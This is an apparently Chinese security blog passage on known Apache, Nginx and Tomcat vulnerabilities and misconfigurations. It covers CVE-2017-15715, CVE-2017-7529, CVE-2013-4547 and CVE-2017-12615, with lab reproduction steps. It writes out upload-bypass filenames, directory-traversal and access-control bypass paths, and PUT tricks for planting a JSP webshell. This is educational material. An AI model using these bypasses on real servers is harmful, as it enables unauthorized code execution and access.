&lt;h3 id=&#34;apache配置缺陷&#34;&gt;Apache配置缺陷&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;AddHandler application/x-httpd-php .php&lt;/code&gt;配置为相应的文件扩展名指定处理程序，表明将扩展名为 &lt;code&gt;.php&lt;/code&gt; 的文件交给 x-httpd-php 程序处理&lt;/li&gt;
&lt;li&gt;Apache识别文件扩展名顺序是从后往前，当遇到无法识别和处理的扩展名，则会接着往前识别，直到遇到第一个可以识别并处理的扩展名&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么在以上两个配置下，可以通过上传&lt;code&gt;xxx.php.png&lt;/code&gt;的文件来绕过文件上传中的白名单机制等等。&lt;/p&gt;
&lt;h4 id=&#34;复现&#34;&gt;复现&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;conf文件配置&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 327; 
			flex-basis: 785px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220227220257782.png&#34; data-size=&#34;501x153&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220227220257782.png&#34;
			width=&#34;501&#34;
			height=&#34;153&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220227220257782_hu8c4c31599b958f0c875105c47be3faa2_22497_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220227220257782_hu8c4c31599b958f0c875105c47be3faa2_22497_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220227220257782&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220227220257782&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.htaccess文件配置&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1293; 
			flex-basis: 3104px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220227220357089.png&#34; data-size=&#34;582x45&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220227220357089.png&#34;
			width=&#34;582&#34;
			height=&#34;45&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220227220357089_hu86148fedf59d4c75eadea6415cca2317_6542_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220227220357089_hu86148fedf59d4c75eadea6415cca2317_6542_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问&lt;code&gt;http://192.168.66.55/phpinfo.php.png&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 757; 
			flex-basis: 1818px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220227220617857.png&#34; data-size=&#34;1432x189&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220227220617857.png&#34;
			width=&#34;1432&#34;
			height=&#34;189&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220227220617857_hub09152a0f87bac8c5ed306dedff2e574_30204_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220227220617857_hub09152a0f87bac8c5ed306dedff2e574_30204_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;apache换行解析漏洞&#34;&gt;Apache换行解析漏洞&lt;/h3&gt;
&lt;p&gt;CVE-2017-15715&lt;/p&gt;
&lt;p&gt;影响：Apache 2.4.10 - 2.4.29&lt;/p&gt;
&lt;h4 id=&#34;原理&#34;&gt;原理&lt;/h4&gt;
&lt;p&gt;在解析文件时，遇到&lt;code&gt;.php\x0a&lt;/code&gt;会按照php后缀进行解析，从而绕过一些安全策略限制，比如文件上传中的白名单。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 270; 
			flex-basis: 649px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220228214003230.png&#34; data-size=&#34;839x310&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220228214003230.png&#34;
			width=&#34;839&#34;
			height=&#34;310&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220228214003230_hu4fce56f04b6dc6f04462b67dfa72feaf_144623_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220228214003230_hu4fce56f04b6dc6f04462b67dfa72feaf_144623_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;复现-1&#34;&gt;复现&lt;/h4&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 324; 
			flex-basis: 777px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220228220852460.png&#34; data-size=&#34;1034x319&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220228220852460.png&#34;
			width=&#34;1034&#34;
			height=&#34;319&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220228220852460_hu95babbacc4d3ad6e411c208fc817b933_48392_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220228220852460_hu95babbacc4d3ad6e411c208fc817b933_48392_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后端使用白名单对后缀进行校验。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在hex中加入&lt;code&gt;0a&lt;/code&gt;尝试绕过：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 762; 
			flex-basis: 1829px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220228222023284.png&#34; data-size=&#34;1921x252&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220228222023284.png&#34;
			width=&#34;1921&#34;
			height=&#34;252&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220228222023284_hu95e78795a16ac5d432abaf18b4e25bd0_57309_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220228222023284_hu95e78795a16ac5d432abaf18b4e25bd0_57309_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现成功上传，访问结果如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 800; 
			flex-basis: 1920px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220228222122411.png&#34; data-size=&#34;1936x242&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220228222122411.png&#34;
			width=&#34;1936&#34;
			height=&#34;242&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220228222122411_hu4874305e3cfdac022deaf838272f986c_28991_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220228222122411_hu4874305e3cfdac022deaf838272f986c_28991_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;nginx&#34;&gt;Nginx&lt;/h2&gt;
&lt;p&gt;Nginx (engine x) 是一个高性能的HTTP和反向代理Web服务器，同时也提供了IMAP/POP3/SMTP服务。&lt;/p&gt;
&lt;h3 id=&#34;nginx配置缺陷&#34;&gt;Nginx配置缺陷&lt;/h3&gt;
&lt;h4 id=&#34;crlf注入&#34;&gt;CRLF注入&lt;/h4&gt;
&lt;p&gt;攻击者向请求行或首部字段注入恶意CRLF和一些响应首部字段或报文主体，且改字段会在响应头中添加，那么在解析时就会误认为在响应头添加了新的首部字段，又称为&lt;strong&gt;HTTP响应拆分漏洞&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在Nginx配置中，可以接收URL的变量有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$URI：获取解码后的请求路径&lt;/li&gt;
&lt;li&gt;$DOCUMENT_URI：与$URI相同&lt;/li&gt;
&lt;li&gt;$REQUEST_URI：未解码的完整URL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nginx中错误的配置：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 原本是希望http请求跳转到https
location / {
    return 302 https://$host$uri;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么在url中引入&lt;code&gt;%0d%0a&lt;/code&gt;和其他内容，则会发生注入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;复现：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 455; 
			flex-basis: 1092px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301152329862.png&#34; data-size=&#34;1266x278&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301152329862.png&#34;
			width=&#34;1266&#34;
			height=&#34;278&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301152329862_hu94961357c3a30dda93a6fb697e16c503_75261_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301152329862_hu94961357c3a30dda93a6fb697e16c503_75261_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;目录穿越&#34;&gt;目录穿越&lt;/h4&gt;
&lt;p&gt;Nginx 在配置别名（Alias）的时候，如果忘记加 &lt;code&gt;/&lt;/code&gt;，将造成一个目录穿越漏洞。&lt;/p&gt;
&lt;p&gt;错误的配置：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 原本的目的是为了让用户访问到 /home/ 目录下的文件
location /files {
    alias /home/;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么访问&lt;code&gt;http://your-ip:8081/files../&lt;/code&gt;可穿越到根目录：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 105; 
			flex-basis: 252px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301152849314.png&#34; data-size=&#34;754x716&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301152849314.png&#34;
			width=&#34;754&#34;
			height=&#34;716&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301152849314_hu224a46e7c57f80088ec907709a1b3adc_58113_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301152849314_hu224a46e7c57f80088ec907709a1b3adc_58113_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;nginx-越界读取缓存&#34;&gt;Nginx 越界读取缓存&lt;/h3&gt;
&lt;p&gt;CVE-2017-7529&lt;/p&gt;
&lt;p&gt;影响版本：Nginx 0.5.6 - 1.13.2&lt;/p&gt;
&lt;h4 id=&#34;原理-1&#34;&gt;原理&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;HTTP Range头：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;HTTP 的 Range，允许客户端分批次请求资源的部分，如果服务端资源较大，可以通过 Range 来并发下载；如果访问资源时网络中断，可以断点续传。Range 设置在 HTTP 请求头中，它是多个 byte-range-spec(或 suffix-range-byte-spec)的集合。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Range：bytes=0-1024 表示访问第 0 到第 1024 字节

Range：bytes=500-600，601-999，-300 表示分三块访问，分别是 500 到 600 字节，601 到 600 字节，最后的 300 字节
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Cache：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nginx作为反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括&lt;code&gt;文件头+HTTP返回包头+HTTP返回包体&lt;/code&gt;。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的&lt;code&gt;HTTP返回包体&lt;/code&gt;返回给用户。&lt;/p&gt;
&lt;p&gt;如果请求中包含Range头，Nginx将会根据指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于&lt;code&gt;HTTP返回包体&lt;/code&gt;前的&lt;code&gt;文件头、HTTP返回包头&lt;/code&gt;等内容。&lt;/p&gt;
&lt;h4 id=&#34;复现-2&#34;&gt;复现&lt;/h4&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 161; 
			flex-basis: 386px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301154543128.png&#34; data-size=&#34;798x495&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301154543128.png&#34;
			width=&#34;798&#34;
			height=&#34;495&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301154543128_hu82c42e9aab32a8d152c62744d48d04af_30140_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301154543128_hu82c42e9aab32a8d152c62744d48d04af_30140_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功越界读取&lt;code&gt;文件头、HTTP返回包头&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;nginx-文件名逻辑漏洞&#34;&gt;Nginx 文件名逻辑漏洞&lt;/h3&gt;
&lt;p&gt;CVE-2013-4547&lt;/p&gt;
&lt;p&gt;影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7&lt;/p&gt;
&lt;p&gt;危害：绕过文件上传、绕过目录限制&lt;/p&gt;
&lt;h4 id=&#34;fastcgi&#34;&gt;FastCGI&lt;/h4&gt;
&lt;p&gt;Nginx不支持对外部动态程序的直接调用或者解析，所有的外部程序（包括PHP）必须通过FastCGI接口来调用。FastCGI接口在Linux下是socket（可以是文件socket，也可以是ip socket）。为了调用CGI程序，还需要一个FastCGI的wrapper，这个wrapper绑定在某个固定socket上，如端口或者文件socket。当Nginx将CGI请求发送给这个socket的时候，通过FastCGI接口，wrapper接收到请求，然后派生出一个新的线程，这个线程调用解释器或者外部程序处理脚本并读取返回数据；接着，wrapper再将返回的数据通过FastCGI接口，沿着固定的socket传递给Nginx；最后，Nginx将返回的数据发送给客户端，这就是Nginx+FastCGI的整个运作过程。&lt;/p&gt;
&lt;p&gt;FastCGI的主要优点是把动态语言和HTTP服务器分离开来，是Nginx专一处理静态请求和向后转发动态请求，而PHP/PHP-FPM服务器专一解析PHP动态请求。&lt;/p&gt;
&lt;h4 id=&#34;原理-2&#34;&gt;原理&lt;/h4&gt;
&lt;p&gt;非法字符空格和截止符 &lt;code&gt;\0&lt;/code&gt; 会导致 Nginx 解析 URI 时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。&lt;/p&gt;
&lt;p&gt;假设服务器上存在文件：&lt;code&gt;file.aaa[空格]&lt;/code&gt;，注意文件名的最后一个字符是空格。则可以通过访问：&lt;code&gt;http://127.0.0.1/file.aaa \0.bbb&lt;/code&gt;，让 Nginx 认为文件 &lt;code&gt;file.aaa&lt;/code&gt;的后缀为 &lt;code&gt;.bbb&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&#34;绕过文件上传-复现&#34;&gt;绕过文件上传-复现&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;漏洞利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;php-fpm.conf 中的 security.limit_extensions 为空，也就是说&lt;strong&gt;任意后缀名都可以解析为 PHP&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Nginx 匹配到 &lt;code&gt;.php&lt;/code&gt; 结尾的请求，就发送给 &lt;code&gt;fastcgi&lt;/code&gt; 进行解析，一般写法如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;location ~ \.php$ {
    include        fastcgi_params;

    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
    fastcgi_param  DOCUMENT_ROOT /var/www/html;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正常情况下（关闭 &lt;code&gt;pathinfo&lt;/code&gt; 的情况下），只有 &lt;code&gt;.php&lt;/code&gt; 后缀的文件才会被发送给 &lt;code&gt;fastcgi&lt;/code&gt; 解析。&lt;/p&gt;
&lt;p&gt;而在 &lt;code&gt;CVE-2013-4547&lt;/code&gt; 的情况下，请求 &lt;code&gt;1.gif[0x20][0x00].php&lt;/code&gt;，这个 URI 可以匹配正则 &lt;code&gt;\.php$&lt;/code&gt;，可以进入这个 Location 块；但进入后Nginx 却错误地认为请求的文件是 &lt;code&gt;1.gif[0x20]&lt;/code&gt;，就设置其为 &lt;code&gt;SCRIPT_FILENAME&lt;/code&gt; 的值发送给 &lt;code&gt;fastcgi&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;fastcgi 根据 &lt;code&gt;SCRIPT_FILENAME&lt;/code&gt; 的值进行解析，最后造成了解析漏洞。&lt;/p&gt;
&lt;p&gt;所以，我们只需要上传一个空格结尾的文件，即可使 PHP 解析之。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;环境中是黑名单验证，这里借助该漏洞上传&lt;code&gt;phpinfo.png&lt;/code&gt;，让其以PHP进行解析：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 200; 
			flex-basis: 480px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301162522534.png&#34; data-size=&#34;1102x551&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301162522534.png&#34;
			width=&#34;1102&#34;
			height=&#34;551&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301162522534_hu4c0924ada3f7c070c1ee86c5bd190696_132118_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301162522534_hu4c0924ada3f7c070c1ee86c5bd190696_132118_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 700; 
			flex-basis: 1682px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301162405411.png&#34; data-size=&#34;1633x233&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301162405411.png&#34;
			width=&#34;1633&#34;
			height=&#34;233&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301162405411_hu381d42ae57e12c1bf0ff7dd4b321c6f3_89158_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301162405411_hu381d42ae57e12c1bf0ff7dd4b321c6f3_89158_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;绕过目录限制&#34;&gt;绕过目录限制&lt;/h4&gt;
&lt;p&gt;限制访问后台IP：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;location /admin/ {
    allow 127.0.0.1;
    deny all;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过请求如下 URI：&lt;code&gt;/test[0x20]/../admin/index.php&lt;/code&gt;，这个 URI 不会匹配上 location 后面的 &lt;code&gt;/admin/&lt;/code&gt;，也就绕过了其中的 IP 验证&lt;/p&gt;
&lt;p&gt;但最后请求的是 &lt;code&gt;/test[0x20]/../admin/index.php&lt;/code&gt; 文件，也就是 &lt;code&gt;/admin/index.php&lt;/code&gt;，成功访问到后台。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;前提是需要有一个目录叫 &lt;code&gt;test &lt;/code&gt;：这是 Linux 系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会报文件不存在的错误， Windows 下没有这个限制&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;nginx-解析漏洞&#34;&gt;Nginx 解析漏洞&lt;/h3&gt;
&lt;p&gt;该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。&lt;/p&gt;
&lt;h4 id=&#34;原理-3&#34;&gt;原理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;nginx 把以 &lt;code&gt;.php&lt;/code&gt; 结尾的文件交给 fastcgi 处理,为此可以构造 &lt;code&gt;http://ip/uploadfiles/test.png/.php&lt;/code&gt;，其中 test.png 是上传的包含 PHP 代码的图片文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fastcgi 在处理 .php 文件时发现文件并不存在，这时 php.ini 配置文件中&lt;code&gt; cgi.fix_pathinfo=1&lt;/code&gt; 发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由 fastcgi 处理的文件就变成了 &lt;code&gt;/test.png&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最重要的一点是 php-fpm.conf 中的 &lt;code&gt;security.limit_extensions &lt;/code&gt;配置项限制了 fastcgi 解析文件的类型(即指定什么类型的文件当做代码解析)，此项设置为空的时候才允许 fastcgi 将 .png 等文件当做代码解析。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;复现-3&#34;&gt;复现&lt;/h4&gt;
&lt;p&gt;访问&lt;code&gt;http://ip/test.png/.php&lt;/code&gt;直接可以php文件解析。&lt;/p&gt;
&lt;h2 id=&#34;tomcat&#34;&gt;Tomcat&lt;/h2&gt;
&lt;p&gt;Tomcat 是 Apache 软件基金会的 Jakarta 项目中的一个核心项目，由 Apache、Sun 和其他一些公司及个人共同开发而成。&lt;/p&gt;
&lt;p&gt;Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用。&lt;/p&gt;
&lt;p&gt;实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行 Tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的。&lt;/p&gt;
&lt;h3 id=&#34;tomcat-配置缺陷&#34;&gt;Tomcat 配置缺陷&lt;/h3&gt;
&lt;p&gt;CVE-2017-12615&lt;/p&gt;
&lt;p&gt;影响版本：Apahce Tomcat 7.0.0 - 7.0.79&lt;/p&gt;
&lt;h4 id=&#34;原理-4&#34;&gt;原理&lt;/h4&gt;
&lt;p&gt;当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。&lt;/p&gt;
&lt;p&gt;Tomcat 配置了可写（readonly=false），导致可以往服务器写文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;servlet&amp;gt;
    &amp;lt;servlet-name&amp;gt;default&amp;lt;/servlet-name&amp;gt;
    &amp;lt;servlet-class&amp;gt;org.apache.catalina.servlets.DefaultServlet&amp;lt;/servlet-class&amp;gt;
    &amp;lt;init-param&amp;gt;
        &amp;lt;param-name&amp;gt;debug&amp;lt;/param-name&amp;gt;
        &amp;lt;param-value&amp;gt;0&amp;lt;/param-value&amp;gt;
    &amp;lt;/init-param&amp;gt;
    &amp;lt;init-param&amp;gt;
        &amp;lt;param-name&amp;gt;listings&amp;lt;/param-name&amp;gt;
        &amp;lt;param-value&amp;gt;false&amp;lt;/param-value&amp;gt;
    &amp;lt;/init-param&amp;gt;
    &amp;lt;init-param&amp;gt;
        &amp;lt;param-name&amp;gt;readonly&amp;lt;/param-name&amp;gt;
        &amp;lt;param-value&amp;gt;false&amp;lt;/param-value&amp;gt;
    &amp;lt;/init-param&amp;gt;
    &amp;lt;load-on-startup&amp;gt;1&amp;lt;/load-on-startup&amp;gt;
&amp;lt;/servlet&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tomcat对文件后缀有限制，无法直接写JSP文件，但是可以利用Windows和Linux的一些特性去写，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows：&lt;code&gt;PUT /test.jsp%20&lt;/code&gt;、&lt;code&gt;PUT /test.jsp::$DATA&lt;/code&gt;、&lt;code&gt;PUT /test.jsp/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Linux：&lt;code&gt;PUT /test.jsp/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;写入shell后直接连接即可。&lt;/p&gt;
&lt;h3 id=&#34;tomcat-弱口令--war-包部署&#34;&gt;Tomcat 弱口令 + war 包部署&lt;/h3&gt;
&lt;p&gt;Tomcat 支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。但是想要访问后台，需要对应用户有相应权限。&lt;/p&gt;
&lt;h4 id=&#34;tomcat-权限&#34;&gt;Tomcat 权限&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;manager（后台管理）
&lt;ul&gt;
&lt;li&gt;manager-gui 拥有 html 页面权限&lt;/li&gt;
&lt;li&gt;manager-status 拥有查看 status 的权限&lt;/li&gt;
&lt;li&gt;manager-script 拥有 text 接口的权限，和 status 权限&lt;/li&gt;
&lt;li&gt;manager-jmx 拥有 jmx 权限，和 status 权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;host-manager（虚拟主机管理）
&lt;ul&gt;
&lt;li&gt;admin-gui 拥有 html 页面权限&lt;/li&gt;
&lt;li&gt;admin-script 拥有 text 接口权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以在&lt;code&gt;conf/tomcat-users.xml&lt;/code&gt;中配置用户权限：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;tomcat-users&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://tomcat.apache.org/xml&amp;#34;&lt;/span&gt;
              &lt;span class=&#34;na&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
              &lt;span class=&#34;na&#34;&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://tomcat.apache.org/xml tomcat-users.xsd&amp;#34;&lt;/span&gt;
              &lt;span class=&#34;na&#34;&gt;version=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&#34;nt&#34;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rolename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;manager-gui&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
